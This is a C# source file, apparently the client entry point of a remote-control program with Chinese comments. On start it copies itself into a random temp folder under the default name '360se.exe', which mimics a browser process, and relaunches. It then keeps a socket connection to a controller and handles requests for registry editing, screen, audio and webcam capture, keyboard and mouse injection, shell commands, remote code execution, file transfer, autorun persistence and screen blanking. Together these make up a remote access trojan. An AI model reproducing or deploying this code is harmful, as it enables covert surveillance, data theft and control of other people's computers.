using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    class Program
    {
        private static Socket oServer;
        private static SocketSession oServerSession;
        private static ClientParameters clientParameters;
        private static bool isTestMode = true;
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;
        private static Dictionary<ePacketType, IRequestHandler> handlers = new Dictionary<ePacketType, IRequestHandler>();
        const string MutexName = "RemoteControl.Client";

        static void Main(string[] args)
        {
            if (args.Length == 1 && args[0].StartsWith("/delay:"))
            {
                string str = args[0].Substring("/delay:".Length);
                int delay = Convert.ToInt32(str);
                Thread.Sleep(delay);
                args = new string[]{};
            }
            ReadParameters();
            if (args.Length == 0)
            {
                // 进行安装操作
                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
                if (!System.IO.Directory.Exists(destinationFileDir))
                {
                    System.IO.Directory.CreateDirectory(destinationFileDir);
                }
                string serviceName = "360se.exe";
                if (!string.IsNullOrWhiteSpace(clientParameters.ServiceName))
                {
                    serviceName = clientParameters.ServiceName;
                }
                var destinationFilePath = destinationFileDir + "\\" + serviceName;
                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
                t.Join();
                return;
            }
            else if (args.Length == 1)
            {
                if (args[0] == "/r")
                {
                    // 进行运行操作
                    if (CommonUtil.IsMultiRun(MutexName))
                        return;
                    InitHandlers();
                    StartConnect();
                    heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
                    heartbeatThread.Start();
                    StartMonitor();
                }
            }
        }

        static void InitHandlers()
        {
            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
            RequestCaptureAudioHandler captureAudioHandler = new RequestCaptureAudioHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            RequestGetProcessesHandler getProcessesHandler = new RequestGetProcessesHandler();
            handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_AUTORUN_REQUEST, new RequestAutoRunHandler());
            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
            RequestOpeFileOrDirHandler opeFileOrDirHandler = new RequestOpeFileOrDirHandler();
            handlers.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
            handlers.Add(ePacketType.PACKET_RENAME_FILE_REQUEST, opeFileOrDirHandler);
            RequestPowerHandler powerHandler = new RequestPowerHandler();
            handlers.Add(ePacketType.PACKET_SHUTDOWN_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_REBOOT_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_SLEEP_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_HIBERNATE_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_LOCK_REQUEST, powerHandler);
            handlers.Add(ePacketType.PACKET_OPEN_URL_REQUEST, new RequestOpenUrlHandler());
            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
            RequestLockMouseHandler lockMouseHandler = new RequestLockMouseHandler();
            handlers.Add(ePacketType.PACKET_LOCK_MOUSE_REQUEST, lockMouseHandler);
            handlers.Add(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, lockMouseHandler);
            RequestBlackScreenHandler blackScreenHandler = new RequestBlackScreenHandler();
            handlers.Add(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, blackScreenHandler);
            handlers.Add(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, blackScreenHandler);
            handlers.Add(ePacketType.PACKET_MESSAGEBOX_REQUEST, new RequestMsgBoxHandler());
            RequestOpeCDHandler opeCDHandler = new RequestOpeCDHandler();
            handlers.Add(ePacketType.PACKET_OPEN_CD_REQUEST, opeCDHandler);
            handlers.Add(ePacketType.PACKET_CLOSE_CD_REQUEST, opeCDHandler);
            RequestPlayMusicHandler playMusicHandler = new RequestPlayMusicHandler();
            handlers.Add(ePacketType.PACKET_PLAY_MUSIC_REQUEST, playMusicHandler);
            handlers.Add(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, playMusicHandler);
            handlers.Add(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, new RequestDownloadWebFileHandler());
            handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
            handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
            handlers.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, new RequestOpenFileHandler());
            RequestCaptureVideoHandler capVideoHandler = new RequestCaptureVideoHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST, capVideoHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST, capVideoHandler);
            RequestUploadHandler uploadHandler = new RequestUploadHandler();
            handlers.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, uploadHandler);
            handlers.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, uploadHandler);
            handlers.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, uploadHandler);
            RequestExecCodeHandler execCodeHandler = new RequestExecCodeHandler();
            execCodeHandler.OnFireQuit = OnFireQuit;
            handlers.Add(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, execCodeHandler);
            handlers.Add(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, execCodeHandler);
            handlers.Add(ePacketType.PACKET_QUIT_APP_REQUEST, new RequestQuitAppHandler() { OnFireQuit = OnFireQuit });
            handlers.Add(ePacketType.PACKET_RESTART_APP_REQUEST, new RequestRestartAppHandler() { OnFireQuit = OnFireQuit });
        }

        static void ReadParameters()
        {
            if (isTestMode)
            {
                clientParameters.SetServerIP("192.168.0.106");
                clientParameters.ServerPort = 10086;
                clientParameters.OnlineAvatar = "";
                clientParameters.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                clientParameters = ClientParametersManager.ReadParameters(filePath); 
            }
            Console.WriteLine("参数信息：");
            Console.WriteLine("IP:" + clientParameters.GetServerIP());
            Console.WriteLine("PORT：" + clientParameters.ServerPort);
        }

        static void StartConnect()
        {
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(clientParameters.GetIPEndPoint());
                    DoOutput("服务器连接成功！");

                    oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
                    StartRecvData(oServerSession);
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData(SocketSession session)
        {
            // 获取主机名，并告诉服务器
            ResponseGetHostName resp = new ResponseGetHostName();
            resp.HostName = Dns.GetHostName();
            resp.AppPath = Application.ExecutablePath;
            resp.OnlineAvatar = clientParameters.OnlineAvatar;
            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);

            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize < 0)
                            continue;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength));
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet)
        {
            ePacketType packetType;
            object obj;
            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
            Console.WriteLine(packetType.ToString());

            if (handlers.ContainsKey(packetType))
            {
                handlers[packetType].Handle(session, packetType, obj);
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void DoOutput(string sMsg)
        {
            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
        }

        static void OnFireQuit(object sender, EventArgs e)
        {
            isClosing = true;
            if (heartbeatThread != null)
            {
                heartbeatThread.Join();
            }
            if (oServerSession != null)
            {
                oServerSession.Send(ePacketType.PACKET_CLIENT_CLOSE_RESPONSE, null);
            }
            Environment.Exit(0);
        }

    }
}
